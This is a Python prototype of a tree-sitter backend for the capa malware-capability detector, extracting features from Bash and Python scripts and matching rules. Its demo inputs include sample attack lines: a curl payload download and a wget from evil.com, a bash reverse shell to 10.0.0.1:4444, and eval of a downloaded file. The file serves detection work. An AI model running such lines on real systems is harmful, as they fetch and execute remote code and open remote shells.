"""Tree-sitter capa backend prototype — Bash + Python feature extraction with rule matching."""

from dataclasses import dataclass
from typing import Iterator
import tree_sitter_bash as tsbash
import tree_sitter_python as tspython
from tree_sitter import Language, Parser, Node

# --- Feature types (mirrors capa.features.insn / capa.features.common) ---

@dataclass(frozen=True)
class API:
    value: str

@dataclass(frozen=True)
class String:
    value: str

@dataclass(frozen=True)
class Number:
    value: int

@dataclass(frozen=True)
class Characteristic:
    value: str

# --- Address type (like AbsoluteVirtualAddress, but line:col) ---

@dataclass(frozen=True)
class ScriptAddress:
    line: int
    col: int
    @classmethod
    def from_node(cls, n: Node): return cls(n.start_point[0] + 1, n.start_point[1])
    def __repr__(self): return f"L{self.line}:{self.col}"

# --- Bash instruction handlers (like viv/insn.py INSTRUCTION_HANDLERS) ---

def bash_api(node):
    if node.type == "command":
        name = node.child_by_field_name("name")
        if name: yield API(name.text.decode())

def bash_string(node):
    if node.type in ("string", "raw_string"):
        t = node.text.decode().strip('"').strip("'")
        if len(t) >= 4: yield String(t)

def bash_number(node):
    if node.type == "number":
        try: yield Number(int(node.text.decode()))
        except ValueError: pass

def bash_char(node):
    if node.type == "pipeline": yield Characteristic("pipe")
    if node.type == "redirected_statement": yield Characteristic("redirect")

# --- Python instruction handlers ---

def python_api(node):
    if node.type == "call":
        func = node.child_by_field_name("function")
        if func: yield API(func.text.decode())

def python_string(node):
    if node.type == "string":
        t = node.text.decode().strip('"').strip("'")
        if len(t) >= 4: yield String(t)

def python_number(node):
    if node.type == "integer":
        try: yield Number(int(node.text.decode(), 0))
        except ValueError: pass

def python_char(node):
    if node.type == "call":
        func = node.child_by_field_name("function")
        if func and func.text.decode() in ("eval", "exec"):
            yield Characteristic("dynamic execution")

HANDLERS = {
    "bash": [bash_api, bash_string, bash_number, bash_char],
    "python": [python_api, python_string, python_number, python_char],
}

# --- Feature extractor (mirrors StaticFeatureExtractor) ---

def walk(node):
    yield node
    for c in node.children: yield from walk(c)

def extract(source: bytes, lang: str) -> dict:
    parser = Parser(Language({"bash": tsbash, "python": tspython}[lang].language()))
    tree = parser.parse(source)
    features = {}
    for node in walk(tree.root_node):
        addr = ScriptAddress.from_node(node)
        for handler in HANDLERS[lang]:
            for feat in handler(node):
                features.setdefault(feat, set()).add(addr)
    return features

# --- Rule matching (simplified capa engine) ---

def match_rules(features):
    rules = [
        ("download file via curl/wget",      "or",  [API("curl"), API("wget")]),
        ("create reverse shell",             "and", [API("bash"), Number(4444)]),
        ("execute shell command (Python)",   "or",  [API("os.system"), API("subprocess.call")]),
        ("dynamic code execution",           "or",  [Characteristic("dynamic execution")]),
    ]
    for name, logic, conditions in rules:
        hits = [c in features for c in conditions]
        if (logic == "and" and all(hits)) or (logic == "or" and any(hits)):
            print(f"  ✅ {name}")

# --- Run ---

if __name__ == "__main__":
    for lang, src in [
        ("bash", b'#!/bin/bash\ncurl -o /tmp/payload "http://evil.com/mal"\nPORT=4444\nbash -i >& /dev/tcp/10.0.0.1/$PORT 0>&1'),
        ("python", b'import os, subprocess\nos.system("wget http://evil.com/bd")\neval(open("/tmp/bd").read())'),
    ]:
        print(f"\n{'='*50}\n  {lang.upper()} script\n{'='*50}")
        feats = extract(src, lang)
        for feat, addrs in sorted(feats.items(), key=lambda x: min(a.line for a in x[1])):
            print(f"  {min(addrs)} → {type(feat).__name__}({feat.value!r})")
        print(f"\n  Rules matched:")
        match_rules(feats)
